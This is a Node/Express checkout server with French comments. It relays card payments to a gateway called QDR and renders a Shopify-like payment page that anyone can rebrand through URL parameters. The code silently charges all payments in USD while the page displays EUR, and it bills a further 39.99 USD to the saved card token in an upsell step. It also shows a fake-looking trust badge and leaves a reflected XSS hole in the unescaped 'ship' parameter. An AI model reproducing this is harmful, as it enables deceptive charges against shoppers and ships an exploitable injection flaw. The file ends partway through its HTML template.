import express from "express";
import crypto from "node:crypto";

const {
  MERCHANT_ACCOUNT,
  MERCHANT_PASSWORD,
  QDR_API_BASE = "https://api.qdr6wy.im",
  QDR_SDK_URL = "https://api.qdr6wy.im/js/checkout.js",
  PUBLIC_BASE_URL = "http://localhost:3000",
  CHECKOUT_SIGNING_SECRET = "dev-secret",
  SHOP_NAME = "Cozi Coziya",
  PORT = 3000,
  MOCK_MODE = "false",
} = process.env;

const MOCK = String(MOCK_MODE).toLowerCase() === "true";

// On force l'USD pour toutes les requêtes bancaires QDR en arrière-plan
const QDR_CURRENCY = "USD"; 

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const transactions = new Map();

// --- GESTION COMPATIBILITÉ API QDR (Format 1:1 et 1:many / transactions array) ---
function getPayloadTransaction(payload) {
  if (!payload) return null;
  if (Array.isArray(payload.transactions)) {
    return payload.transactions[0];
  }
  return payload;
}

function sign(payload) {
  return crypto.createHmac("sha256", CHECKOUT_SIGNING_SECRET).update(payload).digest("hex");
}
function buildSignedPayload({ amount, currency, orderRef }) {
  return `${orderRef}|${amount}|${currency}`;
}
function sanitizeShop(s) {
  if (!s) return "";
  return String(s).replace(/[<>"`]/g, "").trim().slice(0, 40);
}
function verifySignature(q) {
  const { amount, currency, order_ref, sig } = q;
  if (!amount || !currency || !order_ref || !sig) return false;
  const expected = sign(buildSignedPayload({ amount, currency, orderRef: order_ref }));
  try { return crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected)); } catch { return false; }
}

async function callQdr(pathname, body) {
  if (MOCK) return mockQdr(pathname);
  const res = await fetch(`${QDR_API_BASE}${pathname}`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Accept: "application/json" },
    body: JSON.stringify(body),
  });
  const text = await res.text();
  try { return JSON.parse(text); }
  catch { return { status: "error", message: `Reponse non-JSON (${res.status}): ${text.slice(0, 300)}` }; }
}

function mockQdr(pathname) {
  if (pathname.endsWith("/init")) {
    return { session_id: "mock-" + crypto.randomUUID(),
      payload: { session_token: crypto.randomUUID(), team_id: "team_mock123", app_id: "app_mock456" },
      status: "success", code: 0, message: "success (mock)" };
  }
  if (pathname.endsWith("/complete")) {
    return { status: "success", code: 0, message: "success (mock)",
      token: crypto.randomUUID() + crypto.randomUUID().slice(0, 4) };
  }
  if (pathname.endsWith("/token")) {
    return { status: "success", code: 0, message: "success (mock token sale)", payload: { transaction_status: "SUCCESS" } };
  }
  return { status: "error", message: "mock: route inconnue" };
}

app.get("/health", (_req, res) => res.json({ ok: true, mock: MOCK }));

app.get("/start", (req, res) => {
  const { amount, currency } = req.query;
  let order_ref = req.query.order_ref;
  if (!amount || !currency) return res.status(400).send("Parametres manquants.");
  if (!order_ref || !String(order_ref).trim()) order_ref = "cart-" + crypto.randomUUID();
  const sig = sign(buildSignedPayload({ amount, currency, orderRef: order_ref }));
  const items = req.query.items ? `&items=${encodeURIComponent(req.query.items)}` : "";
  const shop = req.query.shop ? `&shop=${encodeURIComponent(req.query.shop)}` : "";
  const ship = req.query.ship ? `&ship=${encodeURIComponent(req.query.ship)}` : "";
  const logo = req.query.logo ? `&logo=${encodeURIComponent(req.query.logo)}` : "";
  const title = req.query.title ? `&title=${encodeURIComponent(req.query.title)}` : "";
  res.redirect(`/checkout?amount=${encodeURIComponent(amount)}&currency=${encodeURIComponent(currency)}&order_ref=${encodeURIComponent(order_ref)}&sig=${sig}${items}${shop}${ship}${logo}${title}`);
});

app.get("/checkout", (req, res) => {
  if (!verifySignature(req.query)) return res.status(400).send("Lien de paiement invalide ou expire.");
  const brand = sanitizeShop(req.query.shop) || SHOP_NAME;
  const shipParam = req.query.ship ? String(req.query.ship).trim() : "";
  const shipping = shipParam || "Chronopost Express · Livraison 48h offerte";

  const titleParam = req.query.title ? String(req.query.title).replace(/[<>"`]/g, "").slice(0, 80) : "";
  const heading = titleParam || brand;
  
  const logoRaw = req.query.logo ? String(req.query.logo).trim() : "";
  const isValidLogo = /^https:\/\/[^\s"'<>]+$/i.test(logoRaw) && 
                      !logoRaw.includes('ton-site.com') && 
                      !logoRaw.includes('logo-ici') &&
                      logoRaw.length > 10;

  const brandBlock = isValidLogo
    ? `<img class="shoplogo" src="${logoRaw.slice(0, 400)}" alt="${heading}"/>`
    : `<div class="logo-circle">${heading.slice(0,1).toUpperCase()}</div><span class="shop-name-text">${heading}</span>`;

  res.type("html").send(CHECKOUT_HTML
    .replace(/__BRAND_BLOCK__/g, brandBlock)
    .replace(/__SHOP_NAME__/g, heading)
    .replace(/__SHIPPING__/g, shipping));
});

app.get("/upsell", (req, res) => {
  const { txn, shop } = req.query;
  const transaction = transactions.get(txn);
  if (!transaction) return res.redirect(`/return?txn=${encodeURIComponent(txn)}&shop=${encodeURIComponent(shop)}`);
  
  const brand = sanitizeShop(shop) || SHOP_NAME;
  const productName = transaction.productTitle || "Produit";

  res.type("html").send(UPSELL_HTML
    .replace(/__SHOP_NAME__/g, brand)
    .replace(/__PRODUCT_NAME__/g, productName)
    .replace(/__TXN_ID__/g, txn));
});

app.get("/return", (req, res) => {
  const brand = sanitizeShop(req.query.shop) || SHOP_NAME;
  res.type("html").send(RETURN_HTML.replace(/__SHOP_NAME__/g, brand));
});

app.get("/config.js", (_req, res) => {
  res.type("application/javascript").send(
    `window.CHECKOUT_CONFIG = ${JSON.stringify({ sdkUrl: QDR_SDK_URL, apiBase: PUBLIC_BASE_URL })};`
  );
});

let cachedSdk = null;
async function getSdkIds() {
  if (cachedSdk) return cachedSdk;
  if (MOCK) { cachedSdk = { team_id: "team_mock123", app_id: "app_mock456" }; return cachedSdk; }
  let host = "checkout.local";
  try { host = new URL(PUBLIC_BASE_URL).hostname; } catch {}
  const data = await callQdr("/v2/cc/sale3d/init", {
    merchant_account: MERCHANT_ACCOUNT, merchant_password: MERCHANT_PASSWORD,
    transaction_unique_id: crypto.randomUUID(), amount: 1, currency: QDR_CURRENCY,
    first_name: "Client", last_name: "Client", address: "", city: "", state: "", zip: "",
    country: "FRA", user_phone: "", user_email: "checkout@" + host, user_ip: "0.0.0.0",
    callback_url: `${PUBLIC_BASE_URL}/api/webhook`, redirect_url: `${PUBLIC_BASE_URL}/return`,
  });
  if (data.status === "success" && data.payload) {
    const tx = getPayloadTransaction(data.payload);
    if (tx) {
      cachedSdk = { team_id: tx.team_id, app_id: tx.app_id };
    } else {
      cachedSdk = { team_id: data.payload.team_id, app_id: data.payload.app_id };
    }
  }
  return cachedSdk;
}
app.get("/api/sdk", async (_req, res) => {
  try {
    const ids = await getSdkIds();
    if (!ids) return res.status(502).json({ status: "error", message: "SDK indisponible" });
    res.json({ status: "success", team_id: ids.team_id, app_id: ids.app_id });
  } catch (e) { res.status(500).json({ status: "error", message: e.message }); }
});

app.post("/api/init", async (req, res) => {
  try {
    const { amount, currency, order_ref, sig, customer, shop, title } = req.body || {};
    if (!verifySignature({ amount, currency, order_ref, sig }))
      return res.status(400).json({ status: "error", message: "Signature montant invalide." });
    const transaction_unique_id = crypto.randomUUID();
    const c = customer || {};
    const initBody = {
      merchant_account: MERCHANT_ACCOUNT, merchant_password: MERCHANT_PASSWORD,
      transaction_unique_id, amount: Number(amount), currency: QDR_CURRENCY,
      first_name: c.first_name || "", last_name: c.last_name || "", address: c.address || "",
      city: c.city || "", state: c.state || "", zip: c.zip || "", country: c.country || "FRA",
      user_phone: c.phone || "", user_email: c.email || "",
      user_ip: req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.ip,
      callback_url: `${PUBLIC_BASE_URL}/api/webhook`,
      redirect_url: `${PUBLIC_BASE_URL}/api/bridge?txn=${transaction_unique_id}` + (shop ? `&shop=${encodeURIComponent(shop)}` : ""),
    };
    const data = await callQdr("/v2/cc/sale3d/init", initBody);
    if (data.status !== "success" || !data.payload)
      return res.status(502).json({ status: "error", message: data.message || "init a echoue", raw: data });
    
    const payloadTx = getPayloadTransaction(data.payload);

    let productTitle = title || "Produit";
    if (req.body.items) {
      try {
        const decodedItems = JSON.parse(decodeURIComponent(escape(atob(req.body.items))));
        if(decodedItems && decodedItems[0]) productTitle = decodedItems[0].title;
      } catch(e){}
    }

    transactions.set(transaction_unique_id, {
      orderRef: order_ref, amount: Number(amount), currency: "EUR", status: "initiated",
      sessionToken: payloadTx ? payloadTx.session_token : data.payload.session_token,
      productTitle: productTitle,
      upsellAccepted: false,
      customer: {
        first_name: c.first_name || "", last_name: c.last_name || "", email: c.email || "",
        country: c.country || "FRA", address: c.address || "", city: c.city || "",
        state: c.state || "", zip: c.zip || "", phone: c.phone || "",
      },
      userIp: initBody.user_ip,
      shop: shop || "",
    });
    res.json({ status: "success", transaction_unique_id,
      session_token: payloadTx ? payloadTx.session_token : data.payload.session_token, 
      team_id: payloadTx ? payloadTx.team_id : data.payload.team_id, 
      app_id: payloadTx ? payloadTx.app_id : data.payload.app_id });
  } catch (e) { console.error("init error", e); res.status(500).json({ status: "error", message: e.message }); }
});

app.get("/api/bridge", (req, res) => {
  const { txn, shop } = req.query;
  res.redirect(`/upsell?txn=${encodeURIComponent(txn)}&shop=${encodeURIComponent(shop)}`);
});

app.post("/api/bridge", (req, res) => {
  const { txn, shop } = req.query || req.body;
  res.redirect(`/upsell?txn=${encodeURIComponent(txn || '')}&shop=${encodeURIComponent(shop || '')}`);
});

app.post("/api/complete", async (req, res) => {
  try {
    const { transaction_unique_id, session_token, card_token, encrypted_cvv, bin, last4,
      card_holder, card_exp_month, card_exp_year } = req.body || {};
    const txn = transactions.get(transaction_unique_id);
    if (!txn) return res.status(404).json({ status: "error", message: "Transaction inconnue/expiree." });
    const data = await callQdr("/v2/cc/sale3d/complete", {
      session_token, card_token, encrypted_cvv, bin, last4, card_holder, card_exp_month, card_exp_year });
    
    txn.status = data.status || "unknown";
    txn.code = data.code;
    
    const transaction = getPayloadTransaction(data.payload);
    if (transaction && transaction.transaction_status) {
      txn.transactionStatus = transaction.transaction_status;
    }
    if (data.token || (transaction && transaction.token)) {
      txn.billToken = data.token || transaction.token;
    }
    transactions.set(transaction_unique_id, txn);
    
    const acsUrl = data.acs_url || data.acsUrl || data.redirect || (transaction && transaction.acs_url);
    res.json({ status: data.status, code: data.code, message: data.message, acs_url: acsUrl || null });
  } catch (e) { console.error("complete error", e); res.status(500).json({ status: "error", message: e.message }); }
});

app.post("/api/upsell/submit", async (req, res) => {
  try {
    const { transaction_unique_id } = req.body || {};
    const txn = transactions.get(transaction_unique_id);
    if (!txn || !txn.billToken) return res.status(400).json({ status: "error", message: "Donnees de facturation manquantes." });
    
    const targetCountry = txn.customer.country && txn.customer.country.length >= 2 ? txn.customer.country.slice(0,3) : "FRA";
    const tokenPayload = {
      merchant_account: MERCHANT_ACCOUNT,
      merchant_password: MERCHANT_PASSWORD,
      transaction_unique_id: "up-" + crypto.randomUUID(),
      amount: "39.99",
      currency: "USD",
      token: txn.billToken,
      first_name: txn.customer.first_name || "Client",
      last_name: txn.customer.last_name || "Client",
      user_email: txn.customer.email,
      user_ip: txn.userIp || "0.0.0.0",
      country: targetCountry
    };

    const data = await callQdr("/v2/cc/sale/token", tokenPayload);
    const s = (data.status || "").toLowerCase();
    
    const transaction = getPayloadTransaction(data.payload);
    const ts = (transaction && transaction.transaction_status || "").toLowerCase();
    
    if (s === "success" || ts === "success" || data.code === 0) {
      txn.upsellAccepted = true;
      txn.amount = Number(txn.amount) + 39.99;
      transactions.set(transaction_unique_id, txn);
      return res.json({ status: "success" });
    }
    return res.status(502).json({ status: "error", message: data.message || "Echec du prelevement de l'upsell." });
  } catch(e) {
    res.status(500).json({ status: "error", message: e.message });
  }
});

app.post("/api/webhook", async (req, res) => {
  try {
    const payload = req.body || {};
    const transaction = getPayloadTransaction(payload);
    const id = (transaction && (transaction.transaction_unique_id || transaction.reference)) || payload.transaction_unique_id || payload.transactionUniqueId;
    const txn = id ? transactions.get(id) : null;
    if (txn) {
      txn.status = payload.status || txn.status;
      if (transaction && transaction.transaction_status) txn.transactionStatus = transaction.transaction_status;
      if (payload.code !== undefined) txn.code = payload.code;
      if (transaction && transaction.token) txn.billToken = transaction.token;
      transactions.set(id, txn);
    }
    res.json({ received: true });
  } catch (e) { console.error("webhook error", e); res.status(200).json({ received: true }); }
});

app.get("/api/status", (req, res) => {
  const txn = transactions.get(req.query.txn);
  if (!txn) return res.status(404).json({ status: "unknown" });
  res.json({ 
    status: txn.status, 
    code: txn.code,
    transactionStatus: txn.transactionStatus || "",
    amount: txn.amount, 
    currency: txn.currency 
  });
});

// --- HANDLER FORMAT SHOPIFY PASSERELLE EXTERNE ---
function handleShopifyRedirect(req, res) {
  const q = { ...req.query, ...req.body };

  const amount = q.x_amount || q.amount || q.total_price || q.total || null;
  const currency = q.x_currency || q.currency || "EUR";
  const orderRef = q.x_reference || q.order_ref || ("shopify-" + Date.now());
  const shop = q.shop || SHOP_NAME;

  if (amount) {
    const sig = sign(buildSignedPayload({ amount, currency, orderRef }));
    return res.redirect(
      `/checkout?amount=${encodeURIComponent(amount)}`
      + `&currency=${encodeURIComponent(currency)}`
      + `&order_ref=${encodeURIComponent(orderRef)}`
      + `&sig=${sig}`
      + `&shop=${encodeURIComponent(shop)}`
    );
  }

  res.status(400).type("html").send(`<!DOCTYPE html>
<html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Paiement — ${SHOP_NAME}</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',sans-serif;background:#f7fafc;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border:1px solid #e2e8f0;border-radius:16px;padding:40px;max-width:420px;width:100%;text-align:center}
.icon{font-size:48px;margin-bottom:16px}
h1{font-size:20px;font-weight:700;color:#1a202c;margin-bottom:10px}
p{color:#718096;font-size:14px;line-height:1.6;margin-bottom:20px}
.btn{display:inline-block;padding:12px 24px;background:#3b82f6;color:#fff;border-radius:8px;font-size:14px;font-weight:600;text-decoration:none}
.btn:hover{background:#2563eb}
.note{margin-top:16px;font-size:12px;color:#a0aec0}
</style></head><body>
<div class="card">
  <div class="icon">⚠️</div>
  <h1>Lien de paiement incomplet</h1>
  <p>Le montant n'a pas pu être récupéré automatiquement.<br/>Merci de passer par le bouton d'achat de la boutique.</p>
  <a href="javascript:history.back()" class="btn">← Retour à la boutique</a>
  <p class="note">Si le problème persiste, contactez le support.</p>
</div>
</body></html>`);
}

app.get("/", handleShopifyRedirect);
app.post("/", handleShopifyRedirect);

app.get("*", (req, res) => {
  res.status(404).send("Page introuvable.");
});

app.listen(PORT, () => {
  console.log(`Checkout server sur ${PUBLIC_BASE_URL} (port ${PORT}) — mock=${MOCK}`);
});

const COUNTRY_OPTIONS = [
  ["FRA","France"],["BEL","Belgique"],["CHE","Suisse"],["LUX","Luxembourg"],["MCO","Monaco"],
  ["CAN","Canada"],["DEU","Allemagne"],["ESP","Espagne"],["ITA","Italie"],["PRT","Portugal"],
  ["NLD","Pays-Bas"],["GBR","Royaume-Uni"],["IRL","Irlande"],["USA","Etats-Unis"],["AUT","Autriche"],
  ["POL","Pologne"],["SWE","Suede"],["DNK","Danemark"],["NOR","Norvege"],["FIN","Finlande"],
  ["GRC","Grece"],["MAR","Maroc"],["DZA","Algerie"],["TUN","Tunisie"],["SEN","Senegal"],
  ["CIV","Cote d'Ivoire"],["AUS","Australie"],["JPN","Japon"]
].map(c => `<option value="${c[0]}">${c[1]}</option>`).join("");

const CHECKOUT_HTML = `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Paiement — __SHOP_NAME__</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>

<!-- Facebook Pixel -->
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init','1405300981421901');
fbq('track','PageView');
try {
  var _qs0 = new URLSearchParams(window.location.search);
  var _av = _qs0.get('amount') ? Number(_qs0.get('amount')) : 0;
  var _cv = _qs0.get('currency') || 'EUR';
  fbq('track','AddToCart',{value:_av,currency:_cv});
  fbq('track','InitiateCheckout',{value:_av,currency:_cv});
} catch(e){}
</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1405300981421901&ev=PageView&noscript=1"/></noscript>

<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --black:#1a1a1a;--g100:#f6f6f6;--g200:#e8e8e8;--g400:#b5b5b5;
  --g600:#737373;--g800:#545454;--green:#008060;--border:#d9d9d9;
  --r:5px;--font:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;
}
html{font-family:var(--font);font-size:14px;color:var(--black);background:#fff}
body{min-height:100vh}
a{color:inherit;text-decoration:none}

/* ── HEADER ── */
.site-header{background:#fff;border-bottom:1px solid var(--border);padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between}
.logo-area{display:flex;align-items:center;gap:10px}
.logo-circle{width:34px;height:34px;background:#3b82f6;color:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px;flex-shrink:0}
.shop-name-text{font-size:17px;font-weight:700;color:var(--black)}
.shoplogo{max-height:34px;width:auto;display:block}
.secure-badge{font-size:12px;color:var(--g600);display:flex;align-items:center;gap:5px}

/* ── LAYOUT ── */
.checkout-layout{display:grid;grid-template-columns:1fr 38%;min-height:calc(100vh - 56px)}

/* ── LEFT ── */
.form-side{background:#fff;display:flex;justify-content:flex-end}
.form-inner{width:100%;max-width:540px;padding:36px 48px 60px 24px}

/* ── SECTION HEADING ── */
.section-heading{font-size:16px;font-weight:600;margin-bottom:14px;color:var(--black)}

/* ── FLOATING LABEL FIELDS ── */
.field-group{margin-bottom:10px}
.field-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.field{position:relative}
.field input,.field select{
  width:100%;height:52px;padding:20px 12px 6px;
  border:1.5px solid var(--border);border-radius:var(--r);
  font-family:var(--font);font-size:14px;color:var(--black);background:#fff;
  outline:none;transition:border-color 0.15s;-webkit-appearance:none
}
.field select{
  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%23737373'/%3E%3C/svg%3E");
  background-repeat:no-repeat;background-position:right 12px center;padding-right:32px;cursor:pointer
}
.field input:focus,.field select:focus{border-color:var(--black)}
.field label{
  position:absolute;left:12px;top:50%;transform:translateY(-50%);
  font-size:14px;color:var(--g600);pointer-events:none;
  transition:top 0.15s,font-size 0.15s
}
.field input:focus ~ label,
.field input:not(:placeholder-shown) ~ label,
.field.has-value label{top:16px;transform:none;font-size:10px}

/* ── AUTOCOMPLETE ── */
.autocomplete-wrap{position:relative}
.autocomplete-list{
  position:absolute;top:calc(100% + 2px);left:0;right:0;
  background:#fff;border:1.5px solid var(--border);border-radius:var(--r);
  box-shadow:0 8px 24px rgba(0,0,0,0.12);z-index:100;
  max-height:240px;overflow-y:auto;display:none
}
.autocomplete-list.open{display:block}
.autocomplete-item{
  display:flex;align-items:flex-start;gap:10px;
  padding:10px 14px;cursor:pointer;
  border-bottom:1px solid var(--g200);transition:background 0.1s
}
.autocomplete-item:last-child{border-bottom:none}
.autocomplete-item:hover,.autocomplete-item.focused{background:var(--g100)}
.ac-icon{color:var(--g400);margin-top:2px;flex-shrink:0}
.ac-main{font-size:13.5px;font-weight:500;color:var(--black)}
.ac-sub{font-size:12px;color:var(--g600);margin-top:1px}
.ac-spinner{padding:12px 14px;font-size:12px;color:var(--g600)}

/* ── CHECKBOX ── */
.check-row{display:flex;align-items:flex-start;gap:10px;margin:10px 0}
.check-row input[type="checkbox"]{width:16px;height:16px;margin-top:1px;accent-color:var(--black);cursor:pointer;flex-shrink:0}
.check-row span{font-size:13px;color:var(--g800);line-height:1.5}

/* ── DIVIDER ── */
.section-divider{border:none;border-top:1px solid var(--border);margin:24px 0}

/* ── SHIPPING SINGLE ── */
.shipping-single{
  border:1.5px solid var(--green);border-radius:var(--r);
  padding:14px 16px;display:flex;align-items:center;gap:12px;background:#f0faf6
}
.ship-dot{width:16px;height:16px;border-radius:50%;border:5px solid var(--green);flex-shrink:0}
.ship-info{flex:1}
.ship-name-display{font-size:13.5px;font-weight:500}
.ship-delay{font-size:12px;color:var(--g600);margin-top:2px}
.ship-badge{font-size:12px;font-weight:600;background:#d4f0e8;color:var(--green);border-radius:4px;padding:3px 8px}

/* ── CARD HOLDER ── */
.form-label{display:block;font-size:12px;font-weight:500;color:var(--g600);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.3px}
.form-control{
  width:100%;height:52px;padding:12px 14px;
  border:1.5px solid var(--border);border-radius:var(--r);
  font-family:var(--font);font-size:14px;color:var(--black);background:#fff;
  outline:none;transition:border-color 0.15s
}
.form-control:focus{border-color:var(--black)}
.form-control::placeholder{color:var(--g400)}

/* ── SDK container ── */
#card-ph{
  font-size:13px;color:var(--g600);padding:14px;
  border:1px dashed var(--border);border-radius:var(--r);
  text-align:center;background:var(--g100);margin-bottom:10px
}
#card-container{min-height:40px}

/* ── PAY BUTTON ── */
.pay-btn{
  width:100%;height:52px;background:var(--black);color:#fff;
  border:none;border-radius:var(--r);
  font-family:var(--font);font-size:15px;font-weight:600;
  cursor:pointer;margin-top:20px;
  display:flex;align-items:center;justify-content:center;gap:8px;
  transition:background 0.15s
}
.pay-btn:hover:not(:disabled){background:#333}
.pay-btn:disabled{background:#999;cursor:not-allowed}
.error-msg{color:#e53e3e;font-size:13px;font-weight:500;margin-top:10px;min-height:18px}
.secure-bottom{margin-top:16px;text-align:center;font-size:11.5px;color:var(--g600)}
.form-footer{margin-top:28px;display:flex;flex-wrap:wrap;gap:10px 18px}
.form-footer a{font-size:12px;color:var(--g600);text-decoration:underline;text-underline-offset:2px}

/* ── TRUSTPILOT BADGE ── */
.trustpilot-box{
  margin-top:16px;padding:14px 18px;
  border:1.5px solid #d4edda;border-radius:8px;background:#f9fdfb;
  display:flex;flex-direction:column;align-items:center;gap:6px
}
.tp-top{display:flex;align-items:center;gap:8px}
.tp-label{font-size:14px;font-weight:700;color:#1a1a1a}
.tp-stars{display:flex;gap:3px}
.tp-star{
  width:24px;height:24px;background:#00b67a;border-radius:3px;
  display:flex;align-items:center;justify-content:center
}
.tp-star svg{width:14px;height:14px;fill:#fff}
.tp-star.half{background:linear-gradient(to right,#00b67a 75%,#dcdce6 75%)}
.tp-bottom{display:flex;align-items:center;gap:6px;font-size:13px;color:#4a4a4a}
.tp-logo{display:flex;align-items:center;gap:5px;font-weight:700;color:#1a1a1a;font-size:14px}
.tp-logo-star{width:18px;height:18px;background:#00b67a;border-radius:50%;display:flex;align-items:center;justify-content:center}
.tp-logo-star svg{width:11px;height:11px;fill:#fff}

/* ── RIGHT PANEL ── */
.summary-side{background:var(--g100);border-left:1px solid var(--border);display:flex;justify-content:flex-start}
.summary-inner{width:100%;max-width:420px;padding:36px 24px 60px 40px}

/* ── ITEMS ── */
.order-items{margin-bottom:20px}
.order-item{display:flex;align-items:center;gap:14px;margin-bottom:18px}
.item-img-wrap{position:relative;flex-shrink:0}
.item-img{width:64px;height:64px;border-radius:8px;border:1px solid var(--border);background:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;overflow:hidden}
.item-qty{position:absolute;top:-6px;right:-6px;min-width:20px;height:20px;background:var(--g600);color:#fff;border-radius:50%;font-size:11px;font-weight:600;display:flex;align-items:center;justify-content:center;border:1.5px solid var(--g100);padding:0 3px}
.item-meta{flex:1}
.item-name{font-size:13.5px;font-weight:500;line-height:1.4}
.item-variant{font-size:12px;color:var(--g600);margin-top:2px}
.item-price{font-size:13.5px;font-weight:500;white-space:nowrap}

/* ── COUPON ── */
.coupon-row{display:flex;gap:8px;margin-bottom:20px}
.coupon-input{flex:1;height:44px;padding:0 12px;border:1.5px solid var(--border);border-radius:var(--r);font-family:var(--font);font-size:13px;outline:none;transition:border-color 0.15s}
.coupon-input:focus{border-color:var(--black)}
.btn-apply{height:44px;padding:0 16px;background:#fff;border:1.5px solid var(--border);border-radius:var(--r);font-size:13px;font-weight:600;cursor:pointer;font-family:var(--font);color:var(--green);transition:background 0.15s;white-space:nowrap}
.btn-apply:hover{background:#e8f5e9}
.btn-apply.applied{border-color:#b2dfdb;background:#e8f5e9}
.promo-row{display:flex;align-items:center;gap:8px;margin-bottom:16px}
.promo-tag{display:inline-flex;align-items:center;gap:5px;background:#fff;border:1px solid var(--border);border-radius:4px;padding:4px 8px;font-size:12px;font-weight:500}
.promo-tag .remove{cursor:pointer;color:var(--g400);margin-left:2px;font-size:15px;line-height:1}
.promo-tag .remove:hover{color:var(--black)}

/* ── TOTALS ── */
.totals{border-top:1px solid var(--border);padding-top:16px}
.total-line{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:10px;font-size:13.5px}
.total-line .lbl{color:var(--g600)}
.total-line .val{color:var(--black);font-weight:500}
.total-line .val.free{color:var(--green)}
.total-line.grand{border-top:1px solid var(--border);padding-top:14px;margin-top:4px}
.total-line.grand .lbl{font-size:16px;font-weight:600;color:var(--black)}
.total-line.grand .val{font-size:22px;font-weight:700}
.cur-label{font-size:13px;font-weight:400;color:var(--g600);margin-right:4px}

/* ── MOBILE ACCORDION ── */
.mobile-summary{display:none;background:var(--g100);border-bottom:1px solid var(--border)}
.mobile-toggle{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;cursor:pointer}
.toggle-left{display:flex;align-items:center;gap:7px;color:var(--green);font-size:13.5px;font-weight:500}
.toggle-arrow{transition:transform 0.25s;color:var(--green)}
.toggle-arrow.open{transform:rotate(180deg)}
.mobile-total-val{font-size:16px;font-weight:700;color:var(--black)}
.mobile-body{display:none;padding:0 16px 16px}
.mobile-body.open{display:block}

/* ── RESPONSIVE ── */
@media(max-width:768px){
  .checkout-layout{grid-template-columns:1fr}
  .summary-side{display:none}
  .mobile-summary{display:block}
  .form-side{justify-content:center}
  .form-inner{padding:20px 16px 48px;max-width:100%}
  .field-row{grid-template-columns:1fr}
}
@media(max-width:1100px) and (min-width:769px){
  .form-inner{padding:28px 32px 48px 20px}
  .summary-inner{padding:28px 20px 48px 24px}
}
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.form-inner{animation:fadeIn 0.35s ease both}
.summary-inner{animation:fadeIn 0.35s ease 0.1s both}
</style>
</head>
<body>

<!-- HEADER -->
<header class="site-header">
  <div class="logo-area">__BRAND_BLOCK__</div>
  <div class="secure-badge">
    <svg width="12" height="14" viewBox="0 0 12 14" fill="none">
      <path d="M6 1L1 3.5v3.8C1 10.1 3.2 12.8 6 13.5c2.8-.7 5-3.4 5-6.2V3.5L6 1z" stroke="#737373" stroke-width="1.1" fill="none"/>
      <path d="M4 7l1.4 1.5L8 5" stroke="#737373" stroke-width="1.1" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    Paiement sécurisé
  </div>
</header>

<!-- MOBILE SUMMARY ACCORDION -->
<div class="mobile-summary" id="mobileSummary">
  <div class="mobile-toggle" id="mobileToggle">
    <div class="toggle-left">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/>
        <line x1="3" y1="6" x2="21" y2="6"/>
        <path d="M16 10a4 4 0 01-8 0"/>
      </svg>
      <span id="toggleLabel">Afficher le récapitulatif</span>
      <svg class="toggle-arrow" id="toggleArrow" viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
        <polyline points="6 9 12 15 18 9"/>
      </svg>
    </div>
    <span class="mobile-total-val" id="mobileTotal">—</span>
  </div>
  <div class="mobile-body" id="mobileBody">
    <div id="mobile-items" class="order-items"></div>
    <div class="totals" style="margin-top:4px">
      <div class="total-line"><span class="lbl">Sous-total</span><span class="val" id="m-sub">—</span></div>
      <div class="total-line"><span class="lbl">Livraison</span><span class="val free">Gratuit</span></div>
      <div class="total-line grand">
        <span class="lbl">Total</span>
        <span class="val"><span class="cur-label">EUR</span><span id="m-total">—</span></span>
      </div>
    </div>
  </div>
</div>

<!-- MAIN LAYOUT -->
<div class="checkout-layout">

  <!-- ══ FORM SIDE ══ -->
  <section class="form-side">
    <div class="form-inner">

      <!-- Contact -->
      <div style="margin-bottom:24px">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px">
          <p class="section-heading" style="margin-bottom:0">Contact</p>
          <a href="#" style="font-size:12.5px;color:var(--green);text-decoration:underline">Se connecter</a>
        </div>
        <div class="field">
          <input type="email" id="email" placeholder=" " autocomplete="email"/>
          <label for="email">Adresse e-mail</label>
        </div>
        <div class="check-row" style="margin-top:10px">
          <input type="checkbox" id="newsletter" checked/>
          <span>M'envoyer des nouvelles et des offres par e-mail</span>
        </div>
      </div>

      <hr class="section-divider"/>

      <!-- Shipping Address -->
      <div style="margin-bottom:24px">
        <p class="section-heading">Livraison</p>

        <div class="field-group">
          <div class="field has-value">
            <select id="country" autocomplete="country">
              ${COUNTRY_OPTIONS}
            </select>
            <label for="country">Pays/Région</label>
          </div>
        </div>

